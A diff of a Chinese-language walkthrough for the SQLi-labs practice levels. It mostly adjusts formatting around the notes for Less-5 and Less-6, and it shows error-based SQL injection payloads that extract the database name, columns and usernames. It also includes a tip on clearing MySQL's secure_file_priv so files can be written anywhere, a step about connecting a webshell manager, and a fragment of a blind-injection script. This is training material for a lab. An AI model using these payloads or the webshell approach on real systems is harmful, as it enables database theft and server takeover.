@@ -167,14 +167,14 @@ https://www.cnblogs.com/xdans/p/5412468.html
 
 有个原因我也理解很久，就是大佬文章中提到的，为何插入虚拟表的时候又要执行一次rand(0)？
 大佬说的是：对于数据库而言，rand(0)就是一个未知的变量，它必须确定具体值才能写入虚拟表。
-我自己的理解是：当虚表中没有rand(0)*2的键值时需要再次rand(0)*2以确定键值是否正确，并取第二次rand(0)*2的值为键值，当有此键值时就不需要在确定了，直接计数+1即可
-    -----------------------------------
+我自己的理解是：当虚表中没有`rand(0)*2`的键值时需要再次`rand(0)*2`以确定键值是否正确，并取第二次`rand(0)*2`的值为键值，当有此键值时就不需要在确定了，直接计数+1即可
+
+---
 先手工：
 1、暴库：``?id=1' union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+``
 2、暴表：``?id=1' union select null,count(*),concat((select column_name from information_schema.columns where table_name='users' limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23``
 3、暴列：``?id=1' union select null,count(*),concat((select column_name from information_schema.columns where table_name='users' limit 7,1),floor(rand()*2))as a from information_schema.tables group by a%23``
 4、暴值：``?id=1' union select null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23``
-
 
 ---
 ### LESS-6 GET-双注入-双引号字符型注入
@@ -209,10 +209,8 @@ https://www.cnblogs.com/xdans/p/5412468.html
 
 ---
 - 知识点又来啦
-- 如果上传失败的话，可能是MySQL没有配置好，我就因为这个费点时间，打开MySQL配置`my.ini`，将`secure_file_priv`置空，如果没有，自行添加 `secure_file_priv = 
-`，这样就可以让文件上传到任何位置，等号后添加路径的话，文件只能上传到此目录下！
+- 如果上传失败的话，可能是MySQL没有配置好，我就因为这个费点时间，打开MySQL配置`my.ini`，将`secure_file_priv`置空，如果没有，自行添加 `secure_file_priv = `,这样就可以让文件上传到任何位置，等号后添加路径的话，文件只能上传到此目录下！
 
--
 ---
 5、菜刀/蚁剑连接即可
 
@@ -347,6 +345,7 @@ for i in range(3,6):
 			break
 print("列名：",column_list)
 ```
+
 ---
 ### LESS-9 GET-基于时间的盲注-单引号字符型注入
 1、这一关，用单引号和双引号都没有报错，输入%df也正常，试一下sleep函数
